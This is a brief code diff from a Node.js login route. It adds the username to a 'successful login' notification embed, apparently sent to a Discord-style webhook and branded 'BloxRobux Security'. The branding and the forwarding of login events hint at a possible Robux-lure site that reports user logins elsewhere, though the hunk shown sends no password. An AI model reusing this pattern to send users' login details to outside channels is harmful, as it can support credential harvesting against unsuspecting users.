@@ -529,7 +529,7 @@ app.post("/login", async (req, res) => {
         body: JSON.stringify({
           embeds: [{
             title: "✅ Tentative de connexion réussi",
-            description: `Connexion réussi pour le compte`,
+            description: `Connexion réussi pour le compte ${username}`,
             color: 0xc27c0e,
             footer: {
               text: "BloxRobux Security",
